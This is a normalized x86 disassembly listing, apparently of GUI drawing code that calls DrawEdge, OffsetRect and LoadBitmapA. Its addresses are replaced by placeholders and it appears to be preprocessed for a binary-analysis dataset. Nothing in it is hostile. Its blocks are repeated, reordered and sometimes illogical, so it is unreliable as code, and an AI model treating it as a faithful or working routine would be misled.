mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424734
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45aecc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_42420c
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45dbc8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_423d0c
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424a0c
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_424504
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_423a40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403190
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424a0c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45dbc8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e707
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_45cc8c
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45dbc8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_45e720
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45f028
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4245b0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_42420c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_423a40
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_40432c
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_42420c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4245b0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45a9b4
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424a0c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424204
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_42420c
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_42420c
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4245b0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424204
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42a714
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4241e0
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4245b0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4245b0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_45eb6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4296c0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_423a40
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45a9b4
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_42420c
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45dbc8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_423d0c
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424a0c
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424734
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45aecc
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424a0c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_424504
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_423a40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403190
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45dbc8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f02f
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_45cc8c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_42486c
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_45dbc8
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_45f17c
push ebx
